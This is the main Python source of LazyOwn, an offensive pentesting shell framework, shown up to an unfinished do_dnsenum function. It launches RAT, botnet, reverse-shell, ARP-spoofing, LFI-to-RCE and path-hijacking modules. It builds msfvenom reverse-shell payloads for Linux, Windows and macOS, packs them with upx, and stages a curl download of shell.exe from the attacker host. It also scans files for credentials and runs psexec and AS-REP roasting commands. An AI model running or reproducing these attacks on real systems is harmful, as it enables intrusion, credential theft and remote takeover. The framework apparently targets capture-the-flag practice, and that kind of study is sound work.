#!/usr/bin/env python3
# _*_ coding: utf8 _*_
"""
main.py

Autor: Gris Iscomeback
Correo electrónico: grisiscomeback[at]gmail[dot]com
Fecha de creación: 09/06/2024
Licencia: GPL v3

Descripción: Este archivo contiene la definición de las rutas y la lógica de la aplicación de Terminal.
LazyOwn Framework SHELL

██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝

"""
import re
import os
import sys
import subprocess
import shlex
import signal
import json
import time
from cmd import Cmd

BANNER = """

    ██▓    ▄▄▄      ▒███████▒▓██   ██▓ ▒█████   █     █░███▄    █                
    ▓██▒   ▒████▄    ▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██▒  ██▒▓█░ █ ░█░██ ▀█   █                
    ▒██░   ▒██  ▀█▄  ░ ▒ ▄▀▒░   ▒██ ██░▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒               
    ▒██░   ░██▄▄▄▄██   ▄▀▒   ░  ░ ▐██▓░▒██   ██░░█░ █ ░█▓██▒  ▐▌██▒               
    ░██████▒▓█   ▓██▒▒███████▒  ░ ██▒▓░░ ████▓▒░░░██▒██▓▒██░   ▓██░               
    ░ ▒░▓  ░▒▒   ▓▒█░░▒▒ ▓░▒░▒   ██▒▒▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒ ░ ▒░   ▒ ▒                
    ░ ░ ▒  ░ ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▓██ ░▒░   ░ ▒ ▒░   ▒ ░ ░ ░ ░░   ░ ▒░               
    ░ ░    ░   ▒   ░ ░ ░ ░ ░ ▒ ▒ ░░  ░ ░ ░ ▒    ░   ░    ░   ░ ░                
        ░  ░     ░  ░  ░ ░     ░ ░         ░ ░      ░            ░                
                    ░         ░ ░                                                
    █████▒██▀███   ▄▄▄       ███▄ ▄███▓▓█████  █     █░ ▒█████   ██▀███   ██ ▄█▀
    ▓██   ▒▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒▓█   ▀ ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ 
    ▒████ ░▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░▒███   ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░ 
    ░▓█▒  ░▒██▀▀█▄  ░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄ ░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄ 
    ░▒█░   ░██▓ ▒██▒ ▓█   ▓██▒▒██▒   ░██▒░▒████▒░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄
    ▒ ░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒
    ░       ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░ ░ ░  ░  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░
    ░ ░     ░░   ░   ░   ▒   ░      ░      ░     ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ 
            ░           ░  ░       ░      ░  ░    ░        ░ ░     ░     ░  ░   
    [*] Iniciando: Framework [;,;] """
NOBANNER = False
version = "v0.0.12"
# Definimos algunos códigos de escape ANSI para colores
RESET = "\033[0m"
BOLD = "\033[1m"
UNDERLINE = "\033[4m"
INVERT = "\033[7m"
BLINK = "\033[5m"

# Colores de texto
BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"

# Colores de fondo
BG_BLACK = "\033[40m"
BG_RED = "\033[41m"
BG_GREEN = "\033[42m"
BG_YELLOW = "\033[43m"
BG_BLUE = "\033[44m"
BG_MAGENTA = "\033[45m"
BG_CYAN = "\033[46m"
BG_WHITE = "\033[47m"

# sys.argv es una lista que contiene los argumentos de la línea de comandos
arguments = sys.argv[1:]  # Omitir el primer elemento que es el nombre del script

# Procesar los argumentos
for arg in arguments:
    if arg == '--help':
        print(f"    {RED}[;,;]{GREEN} LazyOwn {CYAN}{version}{RESET}")
        print(f"    {GREEN}Uso: {WHITE}./run {GREEN}[opciones]{RESET}")
        print(f"    {YELLOW}Opciones:")
        print(f"    {BLUE}  --help         Muestra esta ayuda")
        print(f"    {BLUE}  -v             Muestra la version")
        print(f"    {BLUE}  -c             Ejecuta un comando del LazyOwn ej: ping")
        print(f"    {BLUE}  --no-banner    No muestra el Banner{RESET}")
        sys.exit(0)
        
    elif arg == '-v':
        print(f"    {GREEN} LazyOwn Framework: {version}{RESET}")
        sys.exit(0)

    elif arg == '--no-banner':
        NOBANNER = True

    elif arg.startswith('-c'):
        print(f"    {GREEN}[*] Ejecutando comando {arg}{RESET}")
        break
    else:
        print(f"Argumento no reconocido: {arg}") 
        sys.exit(2) 

def signal_handler(sig, frame):
    global should_exit
    print(f"\n{RED}    [<-]{YELLOW} para salir usar el comando{GREEN} exit, q or qa ...{RESET}")
    should_exit = True
    return

signal.signal(signal.SIGINT, signal_handler)

def is_binary_present(binary_name):
    result = os.system(f"which {binary_name} > /dev/null 2>&1")
    return result == 0

def activate_virtualenv(venv_path):
    # Ejecutar el shell interactivo con el entorno virtual activado
    process = subprocess.Popen(
        ["bash", "-c", f"source {venv_path}/bin/activate && exec bash"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    # Captura la salida del proceso hijo
    stdout, stderr = process.communicate()
    print(f"    {GREEN}[+] Entorno Activado.{RESET}")

def parse_proc_net_file(file_path):
    ports = []
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()

        for line in lines[1:]:  # Skip the header line
            parts = line.split()
            if len(parts) < 2:
                continue
            
            local_address = parts[1]
            # Local address is in the format: "IP:PORT"
            ip, port_hex = local_address.split(':')
            port = int(port_hex, 16)  # Convert hex port to decimal

            # Convert IP address from hex format to standard dot-decimal notation
            ip_parts = [str(int(ip[i:i+2], 16)) for i in range(0, len(ip), 2)]
            ip_address = '.'.join(ip_parts[::-1])  # Reverse the IP parts
            
            ports.append((ip_address, port))
    except FileNotFoundError:
        print(f"    {RED}[-] File {file_path} not found{RESET}")
    except Exception as e:
        print(f"    {RED}[-] An error occurred: {e}{RESET}")
    
    return ports

def get_open_ports():
    tcp_ports = parse_proc_net_file('/proc/net/tcp')
    udp_ports = parse_proc_net_file('/proc/net/udp')
    
    return tcp_ports, udp_ports
def find_credentials(directory):
    # Expresión regular para encontrar posibles credenciales
    regex = re.compile(r'(password|passwd|secret|api_key|token)[\s:=]*[\w\d]{6,}', re.IGNORECASE)
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            try:
                with open(os.path.join(root, file), 'r') as f:
                    content = f.read()
                    matches = regex.findall(content)
                    if matches:
                        print(f"    [+] Credenciales encontradas en {os.path.join(root, file)}:")
                        for match in matches:
                            print(f"    [+] {match}")
            except Exception as e:
                print(f"    [-] No se pudo leer el archivo {file}: {e}")

class LazyOwnShell(Cmd):
    prompt = f"{WHITE}LazyOwn{BLINK}{GREEN}>{RESET} "
    if NOBANNER is True:
        intro = ""
    else:    
        intro = f"""    {YELLOW}[*] Welcome to the LazyOwn Framework [;,;] {BLUE}{version} {WHITE}interactive s{RED}H{WHITE}ell! Type ? to list commands{BLUE}
    {GREEN}[+] Github: {BLUE}{UNDERLINE}https://github.com/grisuno/LazyOwn{RESET}
    {GREEN}[+] Web: {BLUE}{UNDERLINE}https://grisuno.github.io/LazyOwn/{RESET}
    {GREEN}[+] Reddit: {BLUE}{UNDERLINE}https://www.reddit.com/r/LazyOwn/{RESET}
    {GREEN}[+] Facebook: {BLUE}{UNDERLINE}https://web.facebook.com/profile.php?id=61560596232150{RESET}
    {GREEN}[+] hackTheBox: {BLUE}{UNDERLINE}https://app.hackthebox.com/teams/overview/6429 {RESET}
        """
    activate_virtualenv('env')
    os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"    [\033[96m\" iface\"\033[0m] \"a[1] }'")                
    # Diccionario para almacenar alias
    aliases = {
        'auto': 'pyautomate',
        'aslr': 'run lazyaslrcheck',
        'discovery': 'run lazynmapdiscovery',
        'ftpsniff': 'run lazyftpsniff',
        'ls': 'list',
        'nmap': 'run lazynmap',
        'now': 'clock',
        'p': 'payload',
        'poison': 'run lazylogpoisoning',
        'q': 'exit',
        'sniff': 'run lazysniff',
        'venom': 'run lazymsfvenom',        
        'ww':'whatweb',
    }
    def __init__(self):
        super().__init__()
        self.params = {
            "binary_name": "gzip",
            "api_key": None,
            "prompt": None,
            "url": None,
            "method": "GET",
            "headers": "{}",
            "params": "{}",
            "data": "{}",
            "json_data": "{}",
            "proxy_port": 8080,
            "wordlist": None,
            "hide_code": None,
            "mode": None,
            "reverse_shell_port": None,     
            "path": "/",
            "rhost": None,
            "lhost": None,
            "rport": 1337,
            "lport": 1337,
            "rat_key": "82e672ae054aa4de6f042c888111686a",
            "startip": "192.168.1.1",
            "endip": "192.168.1.254",
            "spoof_ip": "185.199.110.153",
            "device": "eth0",
            "email_from": "email@gmail.com",
            "email_to": "email@gmail.com",
            "email_username": "email@gmail.com",
            "email_password": "pa$$w0rd",
            "smtp_server": "smtp.server.com",
            "smtp_port": "587",
            "field": "page",
            "headers_file": None,
            "data_file": None,
            "params_file": None,
            "json_data_file": None,
            "exploitdb": "/usr/share/exploitdb/exploits/",
            "dirwordlist": "/usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt",
            "usrwordlist": "/usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt",
            "dnswordlist": "/usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt",
        }
        self.scripts = [
            "lazysearch",
            "lazysearch_gui",
            "lazyown",
            "update_db",
            "lazynmap",
            "lazyaslrcheck",
            "lazynmapdiscovery",
            "lazygptcli",
            "lazyburpfuzzer",
            "lazymetaextract0r",
            "lazyreverse_shell",
            "lazyattack",
            "lazyownratcli",
            "lazyownrat",
            "lazygath",
            "lazysniff",
            "lazynetbios",
            "lazybotnet",
            "lazybotcli",
            "lazyhoneypot",
            "lazysearch_bot",
            "lazylfi2rce",
            "lazylogpoisoning",
            "lazymsfvenom",
            "lazypathhijacking",
            "lazyarpspoofing",
            "lazyftpsniff",
            "lazyssh77enum",
            "lazywerkzeugdebug",
        ]
        self.output = ""
    
    #def postcmd(self, stop, line):
        # Esto se ejecuta después de cada comando
        #self.display_status()
        #return stop

    #def display_status(self):
        # Aquí es donde puedes personalizar el string que deseas mostrar en el lado opuesto al prompt
        #output = subprocess.getoutput(
        #    "ip a show tun0 2>/dev/null | awk '/inet / { split($2, a, \"/\"); print \"[\\033[96mtun0\\033[0m]\" a[1] }' || ip a show scope global | awk '/^[0-9]+:/ { sub(/:/, \"\", $2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"    [\\033[96m\" iface \"\\033[0m] \" a[1] }'"
        #)
        #status_string = f"{BLINK}☠{RESET}{output}@"
        
        #print(f"{status_string}", end='', flush=True)

    def default(self, line):
        """Handle undefined commands (including aliases)."""
        # Obtener el comando o alias
        command = self.aliases.get(line, line)
        
        # Separar el comando y los argumentos si existe
        parts = command.split(maxsplit=1)
        cmd_name = parts[0]
        cmd_args = parts[1] if len(parts) > 1 else ''
        
        # Ejecutar el comando si existe
        method_name = f'do_{cmd_name}'
        if hasattr(self, method_name):
            return getattr(self, method_name)(cmd_args)
        else:
            print(f"    {GREEN}[?] {YELLOW} Not Found {BLUE}{line}{RESET}")

    def one_cmd(self, command):
        self.output = self.get_output
        try:
            self.onecmd(command)  # Ejecuta el comando directamente
            self.output = "Command executed successfully."
            return self.output
        except Exception as e:
            self.output = str(e)

    def do_set(self, line):
        """Set a parameter value. Usage: set <parameter> <value>"""
        args = shlex.split(line)
        if len(args) != 2:
            print(f"    {YELLOW}[?] Usage: set <parameter> <value>{RESET}")
            return

        param, value = args
        if param in self.params:
            self.params[param] = value
            print(f"    {GREEN}[SET] {YELLOW}{param} set to {GREEN}{value} {RESET}")
        else:
            print(f"    {RED}[?] Unknown parameter: {param}{RESET}")

    def do_show(self, line):
        """Show the current parameter values"""
        for param, value in self.params.items():
            print(f"    [-] {param}: {value}")

    def do_list(self, line):
        """List all available scripts in modules directory, they can use apart from the framework too."""
        scripts = self.scripts
        num_columns = 3
        
        if not scripts:
            print(f"    {RED}[-]No available scripts.{RESET}")
            return
        
        # Calcular el ancho máximo para cada columna
        max_len = max(len(script) for script in scripts)
        column_width = max_len + 2  # Añadir un poco de espacio extra para separación

        # Crear el formato de cada línea en columnas
        rows = [scripts[i:i + num_columns] for i in range(0, len(scripts), num_columns)]
        
        # Mostrar los resultados en columnas
        print(f"    {GREEN}[+]{YELLOW}Available scripts to run:{RESET}  \n")
        for row in rows:
            # Crear una fila con los elementos ajustados al ancho de columna
            print(f"   ".join(f"{script.ljust(column_width)}{RESET}    " for script in row))

    def do_run(self, line):
        """Run a specific LazyOwn script to see all scripts to run see: list or help list"""
        args = shlex.split(line)
        if not args:
            print(f"    {YELLOW}[?] Usage: {GREEN} run <script_name> {RESET}")
            return

        script_name = args[0]
        if script_name in self.scripts:
            getattr(self, f"run_{script_name}")()
        else:
            print(f"    {YELLOW}[?] Unknown script: {RED}{script_name}{RESET}")

    def run_lazysearch(self):
        binary_name = self.params["binary_name"]
        if not binary_name:
            print("    [?] binary_name not set")
            return
        self.run_script("modules/lazysearch.py", binary_name)

    def run_lazysearch_gui(self):
        self.run_script("modules/LazyOwnExplorer.py")

    def run_lazyown(self):
        self.run_script("modules/lazyown.py")

    def run_update_db(self):
        os.system("./modules/update_db.sh")

    def run_lazynmap(self):
        path = os.getcwd()
        target_ip = self.params["rhost"]
        if not target_ip:
            print(f"    {RED}[?]{YELLOW} rhost must be set, {GREEN}help set to more info {RESET}")
            return
        os.system(f"{path}/modules/lazynmap.sh -t {target_ip}")

    def run_lazywerkzeugdebug(self):
        """test werkzeug in debugmode"""
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        rport = self.params["rport"]
        lport = self.params["lport"]
        if not rhost or not lhost or not lport or not rport:
            print(
                "   [-] rhost, lhost, rpor, and lport must be set, to more info see: help set"
            )
            return
        self.run_script("modules/lazywerkzeug.py", rhost, rport, lhost, lport)
        return

    def run_lazygath(self):
        path = os.getcwd()
        os.system(f"sudo {path}/modules/lazygat.sh")

    def run_lazynmapdiscovery(self):
        path = os.getcwd()
        os.system(f"{path}/modules/lazynmap.sh -d")

    def run_lazysniff(self):
        env = os.environ.copy()
        env["LANG"] = "en_US.UTF-8"
        env["TERM"] = "xterm-256color"
        device = self.params["device"]
        subprocess.run(
            ["python3", "modules/lazysniff.py", "-i", device],
            env=env,
            stdin=sys.stdin,
            stdout=sys.stdout,
            stderr=sys.stderr,
        )

    def run_lazyftpsniff(self):
        device = self.params["device"]
        env = os.environ.copy()
        env["LANG"] = "en_US.UTF-8"
        env["TERM"] = "xterm-256color"
        if not device:
            print("    [-] device must be set to choice the interface")
            return
        subprocess.run(["python3", "modules/lazyftpsniff.py", "-i", device])

    def run_lazynetbios(self):
        startip = self.params["startip"]
        endip = self.params["endip"]
        spoof_ip = self.params["spoof_ip"]
        subprocess.run(["python3", "modules/lazynetbios.py", startip, endip, spoof_ip])

    def run_lazyhoneypot(self):
        email_from = self.params["email_from"]
        email_to = self.params["email_to"]
        email_username = self.params["email_username"]
        email_password = self.params["email_password"]
        self.run_script(
            "modules/lazyhoneypot.py",
            "--email_from",
            email_from,
            "--email_to",
            email_to,
            "--email_username",
            email_username,
            "--email_password",
            email_password,
        )

    def run_lazygptcli(self):
        prompt = self.params["prompt"]
        api_key = self.params["api_key"]
        if not prompt or not api_key:
            print("    [?] prompt and api_key must be set")
            return
        os.environ["GROQ_API_KEY"] = api_key
        self.run_script("modules/lazygptcli.py", "--prompt", prompt)

    def run_lazysearch_bot(self):
        prompt = self.params["prompt"]
        api_key = self.params["api_key"]
        if not prompt or not api_key:
            print("    [?] prompt and api_key must be set")
            return
        os.environ["GROQ_API_KEY"] = api_key
        self.run_script("modules/lazysearch_bot.py", "--prompt", prompt)

    def run_lazymetaextract0r(self):
        path = self.params["path"]
        if not path:
            print("    [?] path must be set")
            return
        self.run_script("modules/lazyown_metaextract0r.py", "--path", path)

    def run_lazyownratcli(self):
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        rat_key = self.params["rat_key"]
        if not lhost or not lport or not rat_key:
            print("    [?] lhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazyownclient.py",
            "--host",
            lhost,
            "--port",
            str(lport),
            "--key",
            rat_key,
        )

    def run_lazyownrat(self):
        rhost = self.params["rhost"]
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print("    [?] rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazyownserver.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazybotnet(self):
        rhost = "0.0.0.0"
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print("    [?] rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazybotnet.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazylfi2rce(self):
        rhost = self.params["rhost"]
        rport = self.params["rport"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        field = self.params["field"]
        wordlist = self.params["wordlist"]

        if (
            not rhost
            or not rport
            or not lhost
            or not lport
            or not field
            or not wordlist
        ):
            print("    [?] rhost and rport field and lhost lport wordlist must be set")
            return
        self.run_script(
            "modules/lazylfi2rce.py",
            "--rhost",
            rhost,
            "--rport",
            str(rport),
            "--lhost",
            lhost,
            "--lport",
            str(lport),
            "--field",
            field,
            "--wordlist",
            wordlist,
        )

    def run_lazylogpoisoning(self):
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]

        if not rhost or not lhost:
            print("     [?] rhost and lhost must be set")
            return
        self.run_script(
            "modules/lazylogpoisoning.py", "--rhost", rhost, "--lhost", lhost
        )

    def run_lazybotcli(self):
        rhost = "0.0.0.0"
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print("     [?] rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazybotcli.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazyssh77enum(self):
        wordlist = self.params["usrwordlist"]
        rhost = self.params["rhost"]
        if not wordlist or not rhost:
            print("     rhost and wordlist must be set")
            return
        print(
            "   [?] this may not be accurate. using a version a little bit updated from searchsploit"
        )
        path = os.getcwd()
        os.system(f"{path}/modules/lazybrutesshuserenum.sh {wordlist} {rhost}")

    def run_lazyburpfuzzer(self):
        url = self.params["url"]
        method = self.params["method"]
        headers = self.params["headers"]
        params = self.params["params"]
        data = self.params["data"]
        json_data = self.params["json_data"]
        proxy_port = self.params["proxy_port"]
        wordlist = self.params["wordlist"]
        hide_code = self.params["hide_code"]
        headers_file = self.params.get("headers_file")
        data_file = self.params.get("data_file")
        params_file = self.params.get("params_file")
        json_data_file = self.params.get("json_data_file")

        command = [
            "python3",
            "modules/lazyown_bprfuzzer.py",
            "--url",
            url,
            "--method",
            method,
            "--proxy_port",
            str(proxy_port),
        ]

        if headers_file:
            command.extend(["--headers_file", headers_file])
        else:
            command.extend(["--headers", headers])

        if data_file:
            command.extend(["--data_file", data_file])
        else:
            command.extend(["--data", data])

        if params_file:
            command.extend(["--params_file", params_file])
        else:
            command.extend(["--params", params])

        if json_data_file:
            command.extend(["--json_data_file", json_data_file])
        else:
            command.extend(["--json_data", json_data])

        if wordlist:
            command.extend(["-w", wordlist])
        if hide_code:
            command.extend(["-hc", str(hide_code)])

        self.run_command(command)

    def run_lazyreverse_shell(self):
        ip = self.params["rhost"]
        port = self.params["reverse_shell_port"]
        path = os.getcwd()
        if not ip or not port:
            print(
                "    [?] rhost and reverse_shell_port must be set, more info see, help set"
            )
            return
        os.system(f"{path}/modules/lazyreverse_shell.sh --ip {ip} --puerto {port}")

    def run_lazyarpspoofing(self):
        lhost = self.params["lhost"]
        rhost = self.params["rhost"]
        device = self.params["device"]
        if not lhost or not rhost or not device:
            print("    [?] lhost, lhost, and device must be set")
            return
        os.system(f"modules/lazyarpspoofing.py --device {device} {lhost} {rhost}")

    def run_lazyattack(self):
        path = os.getcwd()
        mode = self.params["mode"]
        target_ip = self.params["rhost"]
        attacker_ip = self.params["lhost"]
        if not mode or not target_ip or not attacker_ip:
            print("    [?] mode, rhost, and lhost must be set, more info see help set")
            return
        os.system(
            f"{path}/modules/lazyatack.sh --modo {mode} --ip {target_ip} --atacante {attacker_ip}"
        )

    def run_lazymsfvenom(self):
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        path = os.getcwd()
        if not lhost or not lport:
            print("    [?] lport and lhost mus be set")
            return
        os.system(
            f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf'
        )
        os.system(
            f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell64.elf'
        )
        os.system(
            f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe'
        )
        os.system(
            f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe'
        )
        os.system(
            f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho'
        )
        os.system(
            f'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho'
        )
        print(f"    {RED}[*] LHOST={lhost} LPORT={lport}")
        
        os.system("mv shell* sessions")
        os.system("chmod +x sessions/*")
        print(f"    {GREEN}[*] Lazy MSFVenom Reverse_shell payloads in sessions/ ")
        print(f"    {MAGENTA}[*] upx to bins to smaller bins{CYAN}")
        os.system("upx sessions/shell.elf")
        os.system("upx sessions/shell.macho")
        os.system("upx sessions/shell.exe")
        os.system("upx sessions/shell64.elf")
        os.system("upx sessions/shell64.macho")
        os.system("upx sessions/shell64.exe")        
        os.system(f"echo 'curl http://{lhost}/shell.exe -o s.exe' | xclip -sel clip")
        print(f"    {YELLOW}[?] To run web server exec command: {GREEN}www {YELLOW}or {GREEN}lazywebshell {RED}[;,;] curl -o s.exe http://{lhost}/shell.exe copy to clipboard :D {RESET}")
        return

    def run_lazyaslrcheck(self):
        print(
            f"{GREEN}[+] Attemp to cat /proc/sys/kernel/randomize_va_space to ksnow if ASLR is active{RESET}"
        )
        result = subprocess.getoutput("cat /proc/sys/kernel/randomize_va_space")
        print(result)
        if result == "0":
            print(f"    {GREEN}[+] ASLR is {RED}deactivated{RESET}")
        elif result == "1":
            print(f"    {GREEN}[+] ASLR is partial {YELLOW}activated{RESET}")
        elif result == "2":
            print(f"    {GREEN}[+] ASLR is activated{RESET}")

    def run_lazypathhijacking(self):
        binary_name = self.params["binary_name"]
        if not binary_name:
            print("    [?] binary_name must be set")
            return
        os.system(f"echo {binary_name} >> modules/tmp.sh")
        os.system(f"cp modules/tmp.sh /tmp/{binary_name}")
        os.system(f"chmod +x /tmp/{binary_name}")
        os.system("export PATH=/tmp:$PATH")
        print(
            f"[*] Lazy path hijacking with binary_name: {binary_name} to set u+s to /bin/bash"
        )

    def run_script(self, script_name, *args):
        """Run a script with the given arguments"""
        command = ["python3", script_name] + [str(arg) for arg in args]
        self.run_command(command)

    def run_command(self, command):
        """Run a command and print output in real-time"""
        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        try:
            for line in iter(process.stdout.readline, ""):
                self.output += line  # Agregar la salida a la variable self.output
                print(line, end="")
            for line in iter(process.stderr.readline, ""):
                self.output += line  # Agregar la salida de stderr también
                print(line, end="")
            process.stdout.close()
            process.stderr.close()
            process.wait()
        except KeyboardInterrupt:
            process.terminate()
            process.wait()
            print("\n[Interrupted] Process terminated")

    def do_payload(self, line):
        """Load parameters from payload.json"""
        try:
            with open("payload.json", "r") as f:
                data = json.load(f)
            for key, value in data.items():
                if key in self.params:
                    self.params[key] = value
            print(f"    {YELLOW}[*] Parameters loaded from{GREEN} payload.json{RESET}")
        except FileNotFoundError:
            print("    [?] payload.json not found")
        except json.JSONDecodeError:
            print("    [?] Error decoding payload.json")

    def do_exit(self, arg):
        """Exit the command line interface."""
        # Si deseas, puedes implementar confirmación aquí
        confirm = input(f"{YELLOW}[?] ¿Seguro que quieres salir? {GREEN}(s/n): {RESET}").strip().lower()
        if confirm == 's':
            print(f'{RED}[->] Saliendo ...{RESET}')
            sys.exit(0)
        else:
            print(f'{RED}[->] Salida Cancelada .{RESET}')
            return False

    def do_fixperm(self, line):
        """Fix Perm LazyOwn shell"""
        print("    [f] Fix script perm")
        os.system("chmod +x modules/*.sh")
        os.system("chmod +x modules/cgi-bin/*")
        return

    def do_lazywebshell(self, line):
        """LazyOwn shell"""
        print("    [r] Running Server in localhost:8888/cgi-bin/lazywebshell.py")
        os.system("cd modules && python3 -m http.server 8888 --cgi &")
        return

    def do_getcap(self, line):
        """try get capabilities :)"""
        print(f"    {YELLOW}[+] Try get capabilities {RESET}")
        os.system("getcap -r / 2>/dev/null")
        return

    def do_getseclist(self, line):
        """get seclist :D"""
        print(f"    {YELLOW}[+] Try to get seclist wordlist [;,;] {RESET}")
        os.system("""cd /usr/share/wordlists/ && sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
        && sudo unzip SecList.zip \
        && sudo  rm -f SecList.zip""")

    def do_smbclient(self, line):
        """Lazy SMBCLient"""
        if not self.params["rhost"]:
            print("    [?] rhost must be set")
            return
        rhost = self.params["rhost"]
        if line:
            print(f"    {YELLOW}[*] Try .. smbclient -N \\\\{rhost}\\\\{line} {RESET}")
            os.system(f"smbclient -N \\\\\\\\{rhost}\\\\{line}")
            return
        print(f"    {GREEN}[*] perform this command: smbclient -N -L \\\\{rhost}\\ {RESET}")
        os.system(f"smbclient -N -L \\\\{rhost}\\")
        print('    [?] exploit smb if is posible mount -t cifs "//10.10.10.10/documetns share" /mnt/smb ')
        return

    def do_smbmap(self, line):
        """smbmap -H 10.10.10.3 [OPTIONS]"""
        rhost = self.params["rhost"]
        if not rhost:
            print("rhost must be set, see help set, ex: set rhost 10.10.10.3 ")
            return
        if not line:
            print(f"    [*] Try... smbmap -H {rhost} -u 'deefbeef'")
            os.system(f"smbmap -H {rhost} -u 'deefbeef'")
            return
        print(f"    [*] try... smbmap -H {rhost} -R {line}")
        os.system(f"smbmap -H {rhost} -R {line}")
        print('    [?] exploit smb if is posible mount -t cifs "//10.10.10.10/documetns share" /mnt/smb ')
        return
    def do_getnpusers(self, line):        
        """sudo impacket-GetNPUsers mist.htb/ -no-pass -usersfile sessions/users.txt"""
        if not line:
            print("    [-] you must pass the domain by argument ex: getnpusers domain.com more info help getnpusers")
            return
        os.system(f"sudo impacket-GetNPUsers {line}/ -no-pass -usersfile sessions/users.txt")
        return
    def do_psexec(self, line):
        """Lazy impacket-psexec administrator@"""
        if not self.params["rhost"]:
            print("    [?] rhost must be set")
            return
        rhost = self.params["rhost"]
        os.system(f"impacket-psexec administrator@{rhost}")

    def do_rpcdump(self, line):
        """rpcdump.py -p 135 10.10.11.24"""
        rhost = self.params["rhost"]
        if not rhost:
            print("rhost must be set more info see help set, or help <TOPIC> ")
            return
        print(f"    {YELLOW}[+] Try... rpcdump.py -p 135 {rhost}{RESET}")
        os.system(f"rpcdump.py -p 135 {rhost}")
        print(f"    {YELLOW}[+] Try... rpcdump.py -p 593 {rhost}{RESET}")
        os.system(f"rpcdump.py -p 593 {rhost}")
        return

    def do_dig(self, line):
        """dig version.bind CHAOS TXT @DNS"""
        rhost = self.params["rhost"]
        if not line or not rhost:
            print(
                "    [-] rhost must be set or you must pass the dns argument like dig box.htb"
            )
            return
        print(f"    [+]{GREEN} Try dig version.bind CHAOS TXT @{line} {RESET}")
        os.system(f"dig version.bind CHAOS TXT @{line}")
        print(f"    dig any {line} @{rhost}")
        os.system(f"dig any {line} @{rhost}")
        return

    def do_cp(self, line):
        """cp {exploitdb}DNS"""
        exploitdb = self.params["exploitdb"]
        path = os.getcwd()
        if not line or not exploitdb:
            print(
                "exploitdb must be set, use set exploitdb /usr/share/exploitdb/exploits/ or pass the relative directory path show in the ss alias of command searchsploit, like cp java/remote/51884.py to see the ralive path use ex: ss TeamCity -x java/remote/51884.py"
            )
            return
        print(f"    {GREEN}[+] Try cp {exploitdb}{line} {path}/sessions/{RESET}")
        os.system(f"cp {exploitdb}{line} {path}/sessions/")

        return

    def do_dnsenum(self, line):
